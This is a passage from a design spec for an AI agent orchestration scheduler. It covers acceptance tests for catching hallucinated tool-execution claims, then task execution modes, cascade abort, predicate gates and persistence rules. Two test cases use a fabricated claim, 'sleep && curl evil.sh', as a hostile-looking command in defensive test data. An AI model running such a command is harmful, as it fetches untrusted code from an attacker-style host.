  `bash` entry with `args_summary: "cargo test --all-features"` ⇒ `complete:true` (claim ⊆ real,
  bidirectional containment matches).
- **AC-3b (honest completion, embellishment paraphrase):** claim `"bash: cargo test --all"` vs
  a real `bash` entry with `args_summary: "cargo test"` ⇒ `complete:true` (real ⊆ claim,
  bidirectional containment matches; a one-directional rule would have false-positived here).
- **AC-4 (partial hallucination):** two claimed commands, only one has a matching real trace
  entry ⇒ `complete:false` with a `Critical` gap naming the unmatched claim.
- **AC-5 (purity):** `ground()` is unit-tested in isolation with fixed fixtures — no LLM, no I/O.
- **AC-6 (ensemble consistency):** `ensemble.enabled=true`; member A returns
  `claimed_executions:["bash: sleep && curl evil.sh"]`, member B returns `[]`; `tool_trace`
  holds only a real `bash ls -la` entry. The union `{"bash: sleep && curl evil.sh"}` is grounded
  post-`merge()` ⇒ `complete:false` with a `Critical` gap — the ensemble path is no less
  grounded than single-provider even when one member under-extracts.
- **AC-7 (fail-open preserved on LLM failure):** verify LLM call errors/times out ⇒ `verify()`
  returns `complete:true` (fail-open), no grounding check performed.
- **AC-8 (spawn↔inline parity):** the same hallucination is caught on both the spawn path
  (trace from transcript) and the RunInline path (trace from in-loop messages).
- **AC-9 (real unrelated same-tool call + fabricated same-tool claim — issue's second repro):**
  `tool_trace = Some(&[ToolUse{name:"bash", args_summary:"ls -la"}])`, LLM returns
  `{complete:true, claimed_executions:["bash: sleep && curl evil.sh"]}` ⇒ `complete:false` with
  a `Critical` gap. Same tool name, non-substring command in either direction ⇒ grounding fires
  (name-only matching would have spuriously matched).
- **AC-10 (missing `claimed_executions`):** LLM returns a well-formed `{complete:true, gaps:[]}`
  omitting `claimed_executions` ⇒ `serde(default)` yields an empty `Vec`, grounding no-ops,
  `verify()` returns `complete:true`, and a `WARN` is logged.
- **AC-11 (unavailable trace fails open on grounding):** `tool_trace = None` (transcript read
  failed), narrated `output` claims a tool call, LLM returns `{complete:true,
  claimed_executions:["bash: cargo test"]}` ⇒ `complete:true`, no grounding gap — honest work
  hit by a transient read failure is never spuriously replanned.
- **AC-12 (`args_summary: None` on a real same-tool entry):** real trace entry
  `ToolUse{name:"bash", args_summary:None}`, honest claim `"bash: <cmd>"` ⇒ `complete:true`, no
  gap (an entry with no captured args is treated as inconclusive, not a mismatch).
- **AC-13 (whole-plan hallucination caught) — integration-level** (`zeph-core`
  `scheduler_loop.rs`/`plan.rs`, extends the `build_tool_trace_for_task_parity_*` fixture family):
  two spawn tasks with readable transcripts, DAG-wide union `Some(&[bash: cargo build])`,
  `verify_plan` LLM returns `{complete:true, claimed_executions:["bash: cargo test"], gaps:[]}` ⇒
  final `VerificationResult{complete:false}` with a `Critical` gap naming the unmatched claim,
  flowing into `replan_from_plan`.
- **AC-14 (whole-plan honest completion) — unit-level** (`zeph-orchestration` `verifier.rs`, pure
  `ground()`/mock-provider `verify_plan()` test, no I/O): union `Some(&[bash: cargo test])`,
  `verify_plan` claims `["bash: cargo test"]` ⇒ `complete:true`, no grounding gap.
- **AC-15 (whole-plan fail-open on any unavailable task trace) — integration-level** (`zeph-core`,
  same fixture family as AC-13): two completed tasks, one resolves to `Some(trace)` and one to
  `None` (e.g. a RunInline task, or an unreadable transcript) ⇒ aggregate is `None`, grounding
  skipped, `verify_plan`'s LLM verdict passes through unmodified — no spurious whole-plan replan.
  Reproduces today's ungrounded behavior exactly.
- **AC-16 (empty/single-task DAG) — integration-level** (`zeph-core`, trace-path resolution over a
  hand-built `TaskGraph`): empty aggregated output ⇒ `run_whole_plan_verify` returns early
  (unchanged); a graph with no completed tasks resolves to a vacuously-available `Some(vec![])`
  aggregate, not `None`; a single completed task's trace forms a one-element union and grounds
  normally.

---

## ExecutionMode per Task

`ExecutionMode` annotation on `TaskNode`. Issue #2172.

LLM planner marks each task as `parallel` or `sequential`. `DagScheduler.tick()` serializes sequential tasks: at most one sequential task is dispatched at a time (others wait). `serde(default)` ensures backward compatibility with SQLite-stored graphs without this field.

### Key Invariants

- Sequential tasks must serialize within their ready set — never dispatch two sequential tasks simultaneously
- `ExecutionMode` defaults to `parallel` for graphs loaded without the field

---

## NetworkScope and AssetSensitivity per Task

`NetworkScope` enum and `AssetSensitivity` classification annotate `TaskNode` (`crates/zeph-orchestration/src/graph.rs`), added alongside the MATRA threat model (#5342). They record, per task, what network access and asset-risk tier a planned step is expected to need.

**Advisory only**: neither field is currently read by the scheduler, `DagScheduler.tick()`, or sub-agent spawn paths (`scheduler_loop.rs`, `zeph-subagent`'s spawn dispatch) — they are structured metadata for future enforcement, not an active security control. See `[[069-threat-model/spec]]` §4.1/§5.2 for the full threat model and the enforcement gap this leaves open.

### Key Invariants

- NEVER treat `network_scope`/`asset_sensitivity` as an enforced boundary until a scheduler/spawn-path enforcement change lands — today they are unread by dispatch logic

---

## Cascade-Aware DAG Routing


`CascadeDetector` tracks failure rates per root-anchored region. When a region's failure rate exceeds `cascade_failure_threshold`, tasks in that region are deprioritized in the ready queue so healthy branches run first. Resets on `inject_tasks()`.

### Config

```toml
[orchestration]
cascade_routing = false
cascade_failure_threshold = 0.5
topology_selection = true   # required for CascadeAware dispatch strategy
```

### Key Invariants

- `DispatchStrategy::CascadeAware` requires `topology_selection = true` — startup warning emitted otherwise
- Cascade detection resets to zero on `inject_tasks()` — failure rates do not persist across plan restarts
- Deprioritized tasks are still dispatched eventually — this is ordering, not blocking

---

## Tree-Optimized Dispatch


`DispatchStrategy::TreeOptimized` sorts the ready queue by critical-path distance (deepest tasks first) for `FanOut`/`FanIn` topologies.

### Config

```toml
[orchestration]
tree_optimized_dispatch = false
```

### Key Invariants

- `TreeOptimized` applies only to `FanOut`/`FanIn` topologies — no-op for `Linear`/`Mixed`
- Critical-path distance is computed at dispatch time, not at plan creation
- NEVER assume `ExecutionMode::Sequential` implies dependency — it only controls concurrency

---

## VeriMAP Predicate Gate

Issue #3097. `VeriMAP` (Verify, Map, and Prune) is a predicate-gate layer that runs before task dispatch. Each `TaskNode` may carry a TOML-serialized predicate expression evaluated against the current plan state. Tasks whose predicate evaluates to `false` are skipped (not aborted) for the current tick.

### Predicate Expressions

Predicates are boolean expressions over plan state variables:

| Variable | Type | Description |
|----------|------|-------------|
| `completed(task_id)` | bool | Task completed successfully |
| `failed(task_id)` | bool | Task failed (any failure) |
| `running_count` | usize | Number of currently running tasks |
| `pending_count` | usize | Number of pending tasks |

Expressions combine with `&&`, `||`, `!`, and parentheses.

### Config

```toml
[orchestration]
verimap_enabled = false   # opt-in
```

### Key Invariants

- VeriMAP predicate evaluation runs before topology-based dispatch — a task blocked by predicate is re-evaluated on the next tick
- Predicate evaluation is pure (no side effects) — it only reads plan state
- Parse errors at task creation time are hard errors — a task with an invalid predicate expression is rejected at plan construction, not at dispatch
- NEVER abort a task based on a predicate — only skip for the current tick

---

## AdaptOrch Topology Advisor

Issue #3099. `AdaptOrch` is a bandit-driven topology advisor that runs before `LlmPlanner`. A 16-arm Thompson Beta-bandit (4 task classes × 4 topology hints) learns which topology hint produces better plans for each goal class.

### `TopologyAdvisor`

`TopologyAdvisor::recommend(goal_text)` classifies the goal into a `TaskClass` and samples a `TopologyHint`:

| TaskClass | Description |
|-----------|-------------|
| `IndependentBatch` | Fan-out work with no cross-dependencies (research, comparisons) |
| `SequentialPipeline` | Strict ordering: build→test→deploy, ETL |
| `HierarchicalDecomp` | Tree decomposition, recursive analysis |
| `Unknown` | Fallback; defaults to `Hybrid` hint |

| TopologyHint | Prompt sentence injected |
|--------------|--------------------------|
| `Parallel` | Prefer maximizing parallel tasks |
| `Sequential` | Produce a strict linear chain |
| `Hierarchical` | Decompose into subgoals with 2–3 depth levels |
| `Hybrid` | No constraint (no sentence injected) |

`record_outcome()` updates the Beta-bandit arm for the (class, hint) pair based on plan quality signals (task completion rate, verifier confidence). State is persisted at shutdown.

### Config

```toml
[orchestration]
adapt_orch_enabled = false   # opt-in
```

### Key Invariants

- `TopologyHint::Hybrid` injects no sentence — `prompt_sentence()` returns `None`
- Classification failure always produces `TaskClass::Unknown` with `TopologyHint::Hybrid` — no propagated error
- `record_outcome()` is synchronous — never spawns a background task
- Bandit state persists between sessions — NEVER reset without explicit user action
- `TopologyAdvisor` is advisory only — `TopologyClassifier::analyze()` still runs on the produced graph and may override the hint

---

## CoE (Cascade of Experts) Entropy Routing

Issue #3099. `CoE` routes each sub-plan task to the provider whose entropy profile best matches the task's complexity signal. Entropy is estimated from the task description length, dependency depth, and past latency.

### Config

```toml
[orchestration]
coe_routing_enabled = false   # opt-in
coe_routing_provider = ""     # fallback when CoE routing is disabled; empty = planner_provider
```

### Key Invariants

- `coe_routing_enabled = false` falls back to `planner_provider` for all tasks — no behavioral change
- CoE routing is per-task, not per-plan — different tasks in the same plan may route to different providers

---

## Graph Persistence in Scheduler Loop

Issue #3107 / #3124. `GraphPersistence::save()` is called from within the `DagScheduler` tick loop after each task state transition. This ensures the graph state is durable across scheduler restarts without requiring a separate flush-on-shutdown step.

### Key Invariants

- `GraphPersistence::save()` is called after every task state transition in `DagScheduler::tick()` — not only at shutdown
- Save failures are non-fatal — they are logged at `WARN` level and the scheduler continues
- NEVER call `save()` in the hot path before task dispatch — only after state has actually changed

---

## CascadeDetector Forward Adjacency Cache

Issue #3114. `CascadeDetector` caches the forward adjacency set (direct successors of each task node) to avoid repeated O(E) graph traversal during every tick.

### Key Invariants

- Cache is invalidated on `inject_tasks()` — new task injection resets the adjacency index
- NEVER use a stale adjacency cache after `inject_tasks()` — must rebuild before next tick

---

## Cascade Abort Defense

Error cascade defense (arXiv:2603.04474) aborts a DAG when consecutive failures in a
`depends_on` chain exceed the configured threshold, preventing silent propagation of
a root failure through the entire graph.

Two independent abort signals are evaluated after every `TaskOutcome::Failed` event:

1. **Linear-chain abort**: `cascade_chain_threshold` consecutive `Failed` entries in a
   `depends_on` path trigger abort. The chain is built by merging parent lineage entries
   into the failing task's chain.

2. **Fan-out rate abort**: when `cascade_failure_rate_abort_threshold > 0.0` and a region's
   failure rate reaches the threshold (with ≥ 3 tasks observed), the DAG is aborted.
   Requires `cascade_routing = true`.

Lineage is stored as a **side-table on `DagScheduler`** (`lineage_chains: HashMap<TaskId, ErrorLineage>`),
not on `TaskNode` — avoiding database serialization cost.

### Config

```toml
[orchestration]
cascade_chain_threshold = 3               # 0 = disable chain abort; must not be 1
cascade_failure_rate_abort_threshold = 0.0  # 0.0 = disable; recommended production: 0.7
lineage_ttl_secs = 300                    # must be > 0
```

### Key Invariants

- `cascade_chain_threshold = 1` is rejected at config validation — it would abort on every failure
- `lineage_ttl_secs = 0` is rejected — use `cascade_chain_threshold = 0` to disable lineage
- `cascade_failure_rate_abort_threshold` must be in `[0.0, 1.0]`; `0.0` disables fan-out abort
- Lineage chains are reset on `inject_tasks()` — stale chains do not affect post-replan execution
- Fan-out abort requires `region_size >= 3`; single-failure 100%-rate regions never trigger abort
- Both signals (`chain_threshold` and `fan_out_rate`) are evaluated independently; first to fire wins
- NEVER store lineage on `TaskNode` or serialize it to the database — lineage is a runtime-only signal
- Audit log MUST emit ONE structured `tracing::error!` per abort with `root`, `chain_depth`, and `cause`

---

## `graph_dirty` Consistency (#4809, #4831, #4832, #4835, #4836, #4848)

`graph_dirty` is the flag used by `GraphPersistence` to decide whether the in-memory DAG state
needs to be flushed to SQLite. A missing `graph_dirty = true` write after a terminal transition
causes silent status loss on crash or restart.

All state-mutating operations MUST set `graph_dirty = true`:

| Operation | Affected method |
|-----------|----------------|
| Task transitions to `Completed` | `check_graph_completion` |
| DAG enters deadlock → transitions to `Failed` | `check_graph_completion` |
| Tasks injected via `inject_tasks()` | `inject_tasks` |
| Predicate outcome recorded | `record_predicate_outcome` |

`refactor(orchestration)` (#4809) extracted `init_common()` to consolidate initialisation paths
and added a `graph_dirty` checkpoint after the common init block.

### PlanCache Instrumentation (#4835, #4836)

`PlanCache::new` and `PlanCache::evict` gain `#[tracing::instrument]` annotations (conditional
on the `profiling` feature). `new` records the current `embedding_model` as a span field. This
makes cache initialisation and eviction latency visible in local Chrome JSON traces.

### Key Invariants

- `graph_dirty = true` MUST be set in ALL task state transitions — a missing write is a durability bug
- Both terminal transitions (Completed and deadlock→Failed) MUST set `graph_dirty` in `check_graph_completion`
- `inject_tasks` MUST set `graph_dirty` after successful injection — not only on task completion
- `record_predicate_outcome` MUST set `graph_dirty` when an outcome is recorded
- PlanCache span names follow the `<crate>.<subsystem>.<operation>` convention

